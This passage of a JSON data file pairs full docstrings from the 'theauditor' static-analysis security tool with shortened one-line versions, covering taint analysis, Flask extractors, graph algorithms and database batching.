    "original": "\"\"\"\n    Get path to a bundled npm tool (TypeScript, ESLint, etc.).\n\n    Args:\n        tool_name: Name of the npm tool (e.g., 'typescript', 'eslint')\n        root_path: Starting directory to search for .auditor_venv (defaults to cwd)\n\n    Returns:\n        Path to the tool's node_modules/.bin directory\n\n    Raises:\n        RuntimeError: If .auditor_venv not found\n    \"\"\"",
    "truncated": "\"\"\"Get path to a bundled npm tool (TypeScript, ESLint, etc.).\"\"\""
  },
  {
    "file": "theauditor/security.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n    Sanitize a file path to prevent path traversal attacks.\n\n    Args:\n        path_str: The path string to sanitize\n        project_root: The root directory to restrict paths within (default: current directory)\n\n    Returns:\n        A resolved Path object that is safe to use\n\n    Raises:\n        SecurityError: If the path attempts to escape the project root\n    \"\"\"",
    "truncated": "\"\"\"Sanitize a file path to prevent path traversal attacks.\"\"\""
  },
  {
    "file": "theauditor/session/detector.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n    Auto-detect AI assistant session directory for current project.\n\n    Supports:\n    - Claude Code: ~/.claude/projects/<project-name>/\n    - Codex: ~/.codex/sessions/YYYY/MM/DD/*.jsonl (filters by cwd in session_meta)\n\n    Args:\n        root_path: Project root directory\n\n    Returns:\n        Path to session directory or None if not found\n    \"\"\"",
    "truncated": "\"\"\"Auto-detect AI assistant session directory for current project.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Append a field to this access path (with k-limiting).\n\n        Args:\n            field: Field name to append\n\n        Returns:\n            New AccessPath with field appended, or None if exceeds max_length\n\n        Examples:\n            >>> path = AccessPath(..., base=\"req\", fields=(\"body\",))\n            >>> path.append_field(\"userId\")\n            AccessPath(..., base=\"req\", fields=(\"body\", \"userId\"))\n        \"\"\"",
    "truncated": "\"\"\"Append a field to this access path (with k-limiting).\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Replace the base variable (for assignments: x = y.f).\n\n        Args:\n            new_base: New base variable name\n\n        Returns:\n            New AccessPath with replaced base\n\n        Examples:\n            >>> path = AccessPath(..., base=\"y\", fields=(\"f\",))\n            >>> path.change_base(\"x\")\n            AccessPath(..., base=\"x\", fields=(\"f\",))\n        \"\"\"",
    "truncated": "\"\"\"Replace the base variable (for assignments: x = y.f).\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n        Discover taint sources from database.\n\n        Instead of searching for hardcoded patterns, we discover actual sources\n        that exist in the codebase by querying the database tables directly.\n\n        Args:\n            sources_dict: Dictionary of source patterns by category from TaintRegistry\n                         (e.g., {'http_request': ['req.', 'request.'], 'user_input': ['body.', ...]})\n\n        Returns:\n            List of source dictionaries with metadata\n        \"\"\"",
    "truncated": "\"\"\"Discover taint sources from database.\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n        Discover security sinks from database.\n\n        Instead of searching for hardcoded patterns, we discover actual sinks\n        that exist in the codebase by querying the database tables directly.\n\n        Args:\n            sinks_dict: Dictionary of sink patterns by category from TaintRegistry\n                       (e.g., {'sql': ['Sequelize.literal', ...], 'command': ['exec', ...]})\n\n        Returns:\n            List of sink dictionaries with metadata\n        \"\"\"",
    "truncated": "\"\"\"Discover security sinks from database.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get request field patterns for a file's language.\n\n        ZERO FALLBACK: Registry is MANDATORY.\n\n        Args:\n            file_path: Path to file for language detection\n\n        Returns:\n            List of request field patterns (e.g., ['req.body', 'req.params'] for JS)\n\n        Raises:\n            ValueError: If registry is not provided (ZERO FALLBACK POLICY)\n        \"\"\"",
    "truncated": "\"\"\"Get request field patterns for a file's language.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Check if file is a controller/route handler.\n\n        Uses TypeResolver if available, falls back to name-based heuristic.\n\n        Args:\n            file_path: Path to file\n\n        Returns:\n            True if file handles API routes\n\n        Raises:\n            ValueError: If type_resolver is not provided (ZERO FALLBACK POLICY)\n        \"\"\"",
    "truncated": "\"\"\"Check if file is a controller/route handler.\"\"\""
  },
  {
    "file": "theauditor/test_frameworks.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Detect the test framework used in a project using unified registry approach.\n\n    Args:\n        root: Root directory of the project.\n\n    Returns:\n        Dictionary with framework info:\n        {\n            \"name\": str,  # pytest, jest, rspec, go, junit, etc.\n            \"language\": str,  # python, javascript, etc.\n            \"cmd\": str,  # Command to run tests\n        }\n    \"\"\"",
    "truncated": "\"\"\"Detect the test framework used in a project using unified registry approach.\"\"\""
  },
  {
    "file": "theauditor/utils/memory.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get recommended memory limit based on system RAM.\n\n    Uses 60% of available RAM because complex SAST analysis needs resources.\n    If you're analyzing enterprise codebases, you need enterprise hardware.\n\n    Priority order:\n    1. Environment variable THEAUDITOR_MEMORY_LIMIT_MB\n    2. Auto-detection (60% of system RAM)\n    3. Fallback to 12GB if detection fails\n\n    Returns:\n        Memory limit in MB (minimum 2GB, maximum 48GB)\n    \"\"\"",
    "truncated": "\"\"\"Get recommended memory limit based on system RAM.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract __slots__ usage.\n\n    Detects classes using __slots__ for memory optimization.\n\n    Returns:\n        List of slots dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'slot_count': int,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract __slots__ usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract abstract base classes (ABC) and abstract methods.\n\n    Detects classes using ABC or @abstractmethod decorators.\n\n    Returns:\n        List of ABC dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'abstract_method_count': int,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract abstract base classes (ABC) and abstract methods.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract naming conventions for visibility (_private, __name_mangling).\n\n    Returns:\n        List of visibility dicts:\n        {\n            'line': int,\n            'name': str,\n            'visibility': str,  # 'public' | 'protected' | 'private'\n            'is_name_mangled': bool,\n            'in_class': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract naming conventions for visibility (_private, __name_mangling).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract set operations (union, intersection, difference, etc.).\n\n    Detects both method calls and operators: union() vs |, intersection() vs &\n\n    Returns:\n        List of set operation dicts:\n        {\n            'line': int,\n            'operation': str,  # Method name\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract set operations (union, intersection, difference, etc.).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract string method calls.\n\n    Detects: split(), join(), strip(), replace(), find(), startswith(), etc.\n\n    Returns:\n        List of string method dicts:\n        {\n            'line': int,\n            'method': str,  # Method name\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract string method calls.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask extension registrations.\n\n    Detects:\n    - Extension instantiations (db = SQLAlchemy())\n    - init_app() calls\n    - Extension configuration\n\n    Security relevance:\n    - SQLAlchemy = SQL injection vector\n    - LoginManager = auth bypass risk\n    - CORS = cross-origin policy\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask extension registrations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask error handler decorators.\n\n    Detects:\n    - @app.errorhandler(404)\n    - @app.errorhandler(Exception)\n    - Custom exception handlers\n\n    Security relevance:\n    - Error handlers = information disclosure risk\n    - Debug info in error messages = vulnerability\n    - Generic exception handlers = hiding errors\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask error handler decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask-SocketIO WebSocket handlers.\n\n    Detects:\n    - @socketio.on('event')\n    - emit() calls\n    - join_room/leave_room\n\n    Security relevance:\n    - WebSocket events = unvalidated input\n    - emit() without auth = unauthorized broadcast\n    - Room management = access control issue\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask-SocketIO WebSocket handlers.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask CLI commands.\n\n    Detects:\n    - @app.cli.command()\n    - @click.command() with Flask context\n    - click.option decorators\n\n    Security relevance:\n    - CLI commands = admin interface\n    - Commands without auth = privilege escalation\n    - Dangerous operations (db drop, user delete)\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask CLI commands.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask CORS configurations.\n\n    Detects:\n    - CORS() instantiation\n    - @cross_origin decorator\n    - CORS configuration dictionaries\n\n    Security relevance:\n    - CORS(*) = unrestricted cross-origin access\n    - Missing CORS = functional issue\n    - Overly permissive origins = CSRF risk\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask CORS configurations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask rate limiting decorators.\n\n    Detects:\n    - @limiter.limit() decorators\n    - Rate limit configurations\n    - Per-route vs global limits\n\n    Security relevance:\n    - Missing rate limits = DoS vulnerability\n    - Overly permissive limits = abuse risk\n    - Login endpoints without limits = brute force risk\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask rate limiting decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask caching decorators.\n\n    Detects:\n    - @cache.cached() decorators\n    - @cache.memoize() decorators\n    - Cache timeout values\n\n    Security relevance:\n    - Caching user-specific data = privacy leak\n    - Long cache timeouts on auth checks = stale permissions\n    - Cache key collisions = data leakage\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask caching decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract Flask/FastAPI routes using Python AST.\n\n    Detects:\n    - Flask @app.route() decorators\n    - Flask @blueprint.route() decorators\n    - FastAPI @app.get/post/put/delete() decorators\n    - Authentication decorators\n    - Dependency injection (FastAPI)\n\n    Returns:\n        List of route dictionaries with method, pattern, auth, etc.\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask/FastAPI routes using Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract datetime module usage.\n\n    Detects datetime(), date(), time(), timedelta(), timezone() usage.\n\n    Returns:\n        List of datetime operation dicts:\n        {\n            'line': int,\n            'datetime_type': str,  # 'datetime' | 'date' | 'time' | 'timedelta' | 'timezone'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract datetime module usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract logging usage patterns.\n\n    Detects logger.debug(), logger.info(), logger.warning(), etc.\n\n    Returns:\n        List of logging pattern dicts:\n        {\n            'line': int,\n            'log_level': str,  # 'debug' | 'info' | 'warning' | 'error' | 'critical'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract logging usage patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract threading and multiprocessing usage.\n\n    Detects Thread(), Lock(), Queue(), Process(), etc.\n\n    Returns:\n        List of threading pattern dicts:\n        {\n            'line': int,\n            'threading_type': str,  # 'Thread' | 'Lock' | 'Queue' | 'Process'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract threading and multiprocessing usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract runtime type checking patterns.\n\n    Detects isinstance(), issubclass(), type() checks.\n\n    Returns:\n        List of type checking dicts:\n        {\n            'line': int,\n            'check_type': str,  # 'isinstance' | 'issubclass' | 'type'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract runtime type checking patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract assertion statements and methods.\n\n    Detects:\n    - assert statements\n    - self.assertEqual, self.assertTrue, etc.\n    - pytest.raises context managers\n    - Assertion counts per function\n\n    Security relevance:\n    - Functions without assertions = untested code\n    - Complex functions with few assertions = insufficient testing\n    \"\"\"",
    "truncated": "\"\"\"Extract assertion statements and methods.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Resolve import alias to full module path.\n\n        Examples:\n            jwt.encode -> jose.jwt.encode (if import jose.jwt as jwt)\n            j.encode -> jwt.encode (if import jwt as j)\n\n        Args:\n            name: Symbol name to resolve\n\n        Returns:\n            Resolved full name\n        \"\"\"",
    "truncated": "\"\"\"Resolve import alias to full module path.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Build FileContext with NodeIndex.\n\n    This is the main entry point for extractors.\n\n    Args:\n        tree: Parsed AST tree\n        content: File content (optional)\n        file_path: Path to file (optional)\n\n    Returns:\n        FileContext with index and pre-computed data\n    \"\"\"",
    "truncated": "\"\"\"Build FileContext with NodeIndex.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract WTForms form definitions.\n\n    Detects:\n    - Form class definitions (inherit from Form or FlaskForm)\n    - Field count (validation surface area)\n    - Custom validators (validate_<field> methods)\n\n    Security relevance:\n    - Forms without validators = incomplete input validation\n    - Missing validators on sensitive fields = injection vulnerabilities\n    - Flask-WTF CSRF protection when using FlaskForm (parity with DRF)\n    \"\"\"",
    "truncated": "\"\"\"Extract WTForms form definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract WTForms field definitions from forms.\n\n    Detects:\n    - Field types (StringField, IntegerField, PasswordField, etc.)\n    - Has validators (validators=[...] keyword argument)\n    - Custom validators (validate_<field> methods)\n\n    Security relevance:\n    - Fields without validators = missing input validation\n    - PasswordField without validators = weak password policy\n    - Missing DataRequired = optional input bypass (parity with DRF required=True)\n    \"\"\"",
    "truncated": "\"\"\"Extract WTForms field definitions from forms.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python_impl.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract all Python data by delegating to specialized extractors.\n\n    This is the main entry point for Python extraction. It coordinates\n    all specialized extractors and merges their results into a unified\n    dictionary that matches the database schema.\n\n    Args:\n        context: FileContext containing AST tree and optimized node index\n\n    Returns:\n        Dictionary containing all extracted data, organized by table name\n    \"\"\"",
    "truncated": "\"\"\"Extract all Python data by delegating to specialized extractors.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract field access expressions.\n\n    Examples: obj.field, self.value, request.body\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of property access dicts\n    \"\"\"",
    "truncated": "\"\"\"Extract field access expressions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract control flow graphs from pre-extracted CFG data.\n\n    PHASE 5 UNIFIED SINGLE-PASS ARCHITECTURE:\n    CFG is now extracted directly in JavaScript using extractCFG() function,\n    which handles ALL node types including JSX (JsxElement, JsxSelfClosingElement, etc.).\n\n    This fixes the jsx='preserved' 0 CFG bug where Python's AST traverser\n    couldn't understand JSX nodes.\n\n    Returns:\n        List of CFG objects (one per function) from extracted_data.cfg\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow graphs from pre-extracted CFG data.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Symbol definition with full context.\n\n    Attributes:\n        name: Symbol name (function, class, variable, etc.)\n        type: Symbol type (function, class, method, variable, etc.)\n        file: File path (normalized relative path)\n        line: Starting line number\n        end_line: Ending line number\n        signature: Type signature if available\n        is_exported: Whether symbol is exported\n        framework_type: Framework-specific type (component, hook, route, etc.)\n    \"\"\"",
    "truncated": "\"\"\"Symbol definition with full context.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Normalize file path for database queries.\n\n        CRITICAL: Call this before ANY query using file paths!\n        Converts Windows absolute paths to Unix-style relative paths\n        that match what's stored in the database.\n\n        Args:\n            file_path: User-provided path (may be absolute Windows path)\n\n        Returns:\n            Normalized path for database LIKE queries\n        \"\"\"",
    "truncated": "\"\"\"Normalize file path for database queries.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Get React/Vue hooks used in a file.\n\n        IMPORTANT: Filters react_hooks table which contains BOTH hooks AND method calls.\n        Only returns actual React hooks (useState, useEffect, etc.) or custom hooks\n        that follow the useXxx naming convention.\n\n        Args:\n            file_path: File path (partial match supported)\n\n        Returns:\n            List of {hook_name, line} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get React/Vue hooks used in a file.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Aggregate all context for a symbol in one call.\n\n        This is the main entry point for 'aud explain <Symbol.method>'.\n\n        Args:\n            symbol_name: Symbol name (resolution applied)\n            limit: Max items per section\n            depth: Call graph traversal depth (1-5)\n\n        Returns:\n            Dict with definition, callers, callees, or error dict\n        \"\"\"",
    "truncated": "\"\"\"Aggregate all context for a symbol in one call.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Upgrade dependencies to latest versions.\n\n    Args:\n        root_path: Project root directory\n        latest_info: Dict from check_latest_versions() with version info\n        deps_list: List of dependency objects to upgrade\n        ecosystems: Optional list of ecosystems to upgrade (py, npm, docker, cargo).\n                   If None, upgrades all ecosystems (YOLO mode).\n\n    Returns dict with counts of upgraded packages per file type.\n    \"\"\"",
    "truncated": "\"\"\"Upgrade dependencies to latest versions.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Load CFG complexity data from database.\n\n    Queries findings_consolidated for cfg-analysis findings using typed columns\n    (cfg_function, cfg_complexity, etc.) - NO JSON parsing.\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        Dict mapping 'file:function' to complexity data\n    \"\"\"",
    "truncated": "\"\"\"Load CFG complexity data from database.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Detect cycles using ITERATIVE DFS (stack-based).\n\n        Safe for deep graphs - no RecursionError risk. Uses explicit stack\n        instead of Python's call stack, allowing unlimited graph depth.\n\n        Args:\n            graph: Graph with 'nodes' and 'edges' keys\n\n        Returns:\n            List of cycles, each with nodes and size\n        \"\"\"",
    "truncated": "\"\"\"Detect cycles using ITERATIVE DFS (stack-based).\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Extract basic statistics from a graph without interpretation.\n\n        This method provides raw counts and statistics only,\n        no subjective metrics or labels.\n\n        Args:\n            graph_data: Large graph dict with 'nodes' and 'edges'\n\n        Returns:\n            Concise summary with raw statistics only\n        \"\"\"",
    "truncated": "\"\"\"Extract basic statistics from a graph without interpretation.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Graph analyzer module - pure graph algorithms for dependency and call graphs.\n\nThis module provides ONLY non-interpretive graph algorithms:\n- Cycle detection (DFS)\n- Shortest path finding (BFS)\n- Layer identification (topological sort)\n- Impact analysis (graph traversal)\n- Statistical summaries (counts and grouping)\n\nFor interpretive metrics like health scores, recommendations, and weighted\nrankings, see the optional graph.insights module.\n\"\"\"",
    "truncated": "\"\"\"Graph analyzer module - pure graph algorithms for dependency and call graphs.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Get all exports for a file (O(1) lookup).\n\n        Args:\n            file_path: File path (Windows or Unix format - auto-normalized)\n\n        Returns:\n            List of export dicts (name, symbol_type, line) or empty list if none\n\n        Example:\n            >>> cache.get_exports(\"theauditor/cli.py\")\n            [{\"name\": \"main\", \"symbol_type\": \"function\", \"line\": 42}]\n        \"\"\"",
    "truncated": "\"\"\"Get all exports for a file (O(1) lookup).\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Generic bulk saver using executemany for 10x performance.\n\n        Consolidates all save_*_graph methods into a single implementation.\n        Uses SQLite's executemany() to batch insert operations into one transaction.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges' keys\n            graph_type: Graph type identifier ('import', 'call', 'data_flow', custom)\n            default_node_type: Default type for nodes if not specified\n            default_edge_type: Default type for edges if not specified\n        \"\"\"",
    "truncated": "\"\"\"Generic bulk saver using executemany for 10x performance.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Build edges from Python decorators.\n\n        Logic:\n        - Decorators wrap functions, so data flows THROUGH the decorator first\n        - Create edge: Decorator -> Function\n        - This allows taint analysis to \"see\" validation decorators\n\n        Example: @validate_json wraps create_user\n        - Data enters validate_json first\n        - Then flows to create_user\n        - If validate_json is a sanitizer, path is marked safe\n        \"\"\"",
    "truncated": "\"\"\"Build edges from Python decorators.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Build edges from Django global middleware to views.\n\n        Logic:\n        - Django middleware runs BEFORE every view (configured in settings.MIDDLEWARE)\n        - Create edges: Middleware -> All Views\n        - This allows taint analysis to \"see\" global auth/security middleware\n\n        Example: BasicAuthMiddleware protects all views\n        - Request enters middleware first\n        - Then flows to view\n        - If middleware is a sanitizer (auth check), path is marked safe\n        \"\"\"",
    "truncated": "\"\"\"Build edges from Django global middleware to views.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Generate DOT format with architectural layers as subgraphs.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges'\n            layers: Dict mapping layer number to list of node IDs\n            analysis: Optional analysis results\n            options: Optional visualization options\n\n        Returns:\n            DOT format string with layer subgraphs\n        \"\"\"",
    "truncated": "\"\"\"Generate DOT format with architectural layers as subgraphs.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Generate DOT format showing only hotspot nodes and their connections.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges'\n            hotspots: List of hotspot dicts with 'id' and metrics\n            options: Optional visualization options\n            top_n: Number of top hotspots to show (default: 10)\n\n        Returns:\n            DOT format string with only hotspot-related elements\n        \"\"\"",
    "truncated": "\"\"\"Generate DOT format showing only hotspot nodes and their connections.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Graph visualizer module - rich Graphviz visualization with visual intelligence.\n\nThis module transforms raw graph data and analysis results into actionable\nvisualizations using Graphviz DOT format with intelligent visual encoding.\n\nVisual encoding strategy:\n- Node color: Programming language\n- Node size: Importance/connectivity (in-degree)\n- Edge color: Red for cycles, gray for normal\n- Edge style: Import type (solid/dashed/dotted)\n- Node shape: Type (box=module, ellipse=function)\n\"\"\"",
    "truncated": "\"\"\"Graph visualizer module - rich Graphviz visualization with visual intelligence.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Correlate GraphQL fields with resolver functions.\n\n        Matching strategies:\n        1. Graphene: resolve_<field> method name in ObjectType class\n        2. Ariadne: @query.field(\"name\") → function name\n        3. Strawberry: @strawberry.field on method → method name = field name\n        4. Apollo: Query.<field> → <field>Resolver or resolve<Field> function\n        5. NestJS/TypeGraphQL: @Query() decorator with field name\n\n        Returns:\n            Number of resolver mappings created\n        \"\"\"",
    "truncated": "\"\"\"Correlate GraphQL fields with resolver functions.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Execute all pending batch inserts using schema-driven approach.\n\n        ARCHITECTURE: Hybrid flushing strategy.\n        - Generic tables: Use flush_generic_batch() (475 lines → 50 lines)\n        - CFG tables: Keep special case logic for ID mapping (required)\n        - JWT patterns: Keep special flush method (dict-based interface)\n\n        Special Cases:\n        1. CFG blocks: MUST be inserted before edges/statements (ID dependencies)\n        2. Junction tables: MUST be inserted after parent records\n        3. INSERT modes: Respect OR REPLACE/OR IGNORE for specific tables\n        \"\"\"",
    "truncated": "\"\"\"Execute all pending batch inserts using schema-driven approach.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a symbol record to the batch.\n\n        Args:\n            path: File path containing the symbol\n            name: Symbol name\n            symbol_type: Type of symbol ('function', 'class', 'variable', etc.)\n            line: Line number where symbol is defined\n            col: Column number where symbol is defined\n            end_line: Last line of symbol definition (optional)\n            type_annotation: TypeScript/type annotation (optional)\n            parameters: JSON array of parameter names for functions (optional, e.g., '[\"data\", \"_createdBy\"]')\n        \"\"\"",
    "truncated": "\"\"\"Add a symbol record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a function call argument record to the batch.\n\n        Args:\n            file_path: File containing the function call\n            line: Line number of the call\n            caller_function: Name of the calling function\n            callee_function: Name of the called function\n            arg_index: Index of the argument (0-based)\n            arg_expr: Expression passed as argument\n            param_name: Parameter name in callee signature\n            callee_file_path: Resolved file path where callee is defined (for cross-file tracking)\n        \"\"\"",
    "truncated": "\"\"\"Add a function call argument record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a JSX assignment record for preserved JSX extraction.\n\n        ARCHITECTURE: Normalized many-to-many relationship (JSX variant).\n        - Phase 1: Batch JSX assignment record (without source_vars column)\n        - Phase 2: Batch JSX junction records for each source variable\n\n        Args:\n            property_path: Full property path for destructured assignments (e.g., 'req.params.id')\n                          NULL for non-destructured assignments (e.g., 'const x = y')\n\n        NO FALLBACKS. If source_vars is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a JSX assignment record for preserved JSX extraction.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/frameworks_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add an ORM relationship record to the batch.\n\n        Args:\n            file: File containing the relationship definition\n            line: Line number of the relationship\n            source_model: Source model name (e.g., \"User\")\n            target_model: Target model name (e.g., \"Account\")\n            relationship_type: Type of relationship - \"hasMany\", \"belongsTo\", \"hasOne\", etc.\n            foreign_key: Foreign key column name (e.g., \"account_id\")\n            cascade_delete: Whether CASCADE delete is enabled\n            as_name: Association alias (e.g., \"owner\")\n        \"\"\"",
    "truncated": "\"\"\"Add an ORM relationship record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a GraphQL type definition record to the batch.\n\n        Args:\n            schema_path: FK to graphql_schemas.file_path\n            type_name: Name of the type (e.g., 'User', 'Query', 'Mutation')\n            kind: Type kind - 'object', 'interface', 'input', 'enum', 'union', 'scalar'\n            implements: JSON array of interface names (optional)\n            description: Type description from schema (optional)\n            line: Line number in schema file (optional)\n\n        NO FALLBACKS. Type resolution happens at extraction time.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL type definition record to the batch.\"\"\""
  },
  {
